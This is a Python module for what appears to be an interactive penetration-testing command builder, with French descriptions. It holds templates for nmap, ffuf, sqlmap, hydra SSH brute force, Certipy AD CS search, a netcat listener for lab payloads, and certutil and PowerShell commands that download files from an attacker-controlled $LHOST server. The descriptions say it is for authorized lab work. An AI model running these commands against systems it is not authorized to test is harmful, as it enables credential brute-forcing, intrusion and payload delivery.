"""Command template rendering for the interactive command builder."""

from __future__ import annotations

import re
from dataclasses import dataclass


PLACEHOLDER_RE = re.compile(r"\$([A-Z][A-Z0-9_]*)")


@dataclass(frozen=True)
class CommandTemplate:
    key: str
    label: str
    category: str
    command: str
    description: str


COMMAND_TEMPLATES: tuple[CommandTemplate, ...] = (
    CommandTemplate(
        "nmap-basic",
        "Nmap service scan",
        "recon",
        "nmap -sC -sV -oA scans/nmap_$TARGET $TARGET",
        "Scan TCP standard avec scripts par défaut et détection de version.",
    ),
    CommandTemplate(
        "nmap-full",
        "Nmap full TCP",
        "recon",
        "sudo nmap -p- --min-rate 5000 -oA scans/nmap_full_$TARGET $TARGET",
        "Découverte de tous les ports TCP, à relancer ensuite avec -sC -sV.",
    ),
    CommandTemplate(
        "ffuf-dir",
        "FFUF directory fuzz",
        "web",
        "ffuf -u http://$TARGET/FUZZ -w $WORDLIST -mc all",
        "Fuzz de chemins web avec wordlist.",
    ),
    CommandTemplate(
        "ffuf-vhost",
        "FFUF vhost fuzz",
        "web",
        "ffuf -u http://$TARGET/ -H 'Host: FUZZ.$DOMAIN' -w $WORDLIST -fs 0",
        "Découverte de virtual hosts sur un domaine autorisé.",
    ),
    CommandTemplate(
        "sqlmap-url",
        "SQLMap URL check",
        "web",
        "sqlmap -u '$URL' --batch --risk=1 --level=1",
        "Vérification SQLi prudente sur une URL explicitement autorisée.",
    ),
    CommandTemplate(
        "hydra-ssh",
        "Hydra SSH",
        "passwords",
        "hydra -l $USER -P $WORDLIST ssh://$TARGET -t 4 -V",
        "Audit de mot de passe SSH sur lab ou système autorisé.",
    ),
    CommandTemplate(
        "netexec-smb",
        "NetExec SMB auth",
        "ad",
        "netexec smb $TARGET -u $USER -p '$PASSWORD' --shares",
        "Vérification SMB/auth et listing des partages accessibles.",
    ),
    CommandTemplate(
        "certipy-find",
        "Certipy ADCS find",
        "ad",
        "certipy find -u '$USER@$DOMAIN' -p '$PASSWORD' -dc-ip $DC_IP -vulnerable -stdout",
        "Audit AD CS en environnement Active Directory autorisé.",
    ),
    CommandTemplate(
        "curl-burp",
        "Curl through Burp",
        "web",
        "curl -k -i --proxy http://127.0.0.1:8080 '$URL'",
        "Rejouer une requête via proxy Burp local.",
    ),
    CommandTemplate(
        "nc-listener",
        "Netcat listener",
        "post",
        "rlwrap -cAr nc -lvnp $LPORT",
        "Listener local pour payloads de lab.",
    ),
    CommandTemplate(
        "python-http",
        "Python HTTP server",
        "transfer",
        "python3 -m http.server $PORT",
        "Serveur HTTP local simple pour transfert de fichiers en lab.",
    ),
    CommandTemplate(
        "smb-server",
        "Impacket SMB server",
        "transfer",
        "impacket-smbserver share . -smb2support",
        "Partage SMB local temporaire pour environnements Windows lab.",
    ),
    CommandTemplate(
        "certutil-download",
        "Windows certutil download",
        "transfer",
        "certutil.exe -urlcache -split -f http://$LHOST:$PORT/$FILE $FILE",
        "Téléchargement Windows depuis le serveur HTTP de lab.",
    ),
    CommandTemplate(
        "powershell-download",
        "PowerShell download",
        "transfer",
        "powershell -NoP -C \"iwr http://$LHOST:$PORT/$FILE -OutFile $FILE\"",
        "Téléchargement PowerShell depuis le serveur HTTP de lab.",
    ),
)


def template_by_key(key: str) -> CommandTemplate | None:
    wanted = key.strip().lower()
    return next((tpl for tpl in COMMAND_TEMPLATES if tpl.key == wanted), None)


def render_template(template: CommandTemplate, variables: dict[str, str]) -> tuple[str, list[str]]:
    """Render a template and return the missing placeholders."""
    normalized = {key.upper(): value for key, value in variables.items()}
    missing: list[str] = []

    def replace(match: re.Match[str]) -> str:
        key = match.group(1)
        value = normalized.get(key)
        if value is None or value == "":
            missing.append(key)
            return match.group(0)
        return value

    rendered = PLACEHOLDER_RE.sub(replace, template.command)
    return rendered, sorted(set(missing))


def placeholders_for(template: CommandTemplate) -> list[str]:
    return sorted(set(PLACEHOLDER_RE.findall(template.command)))
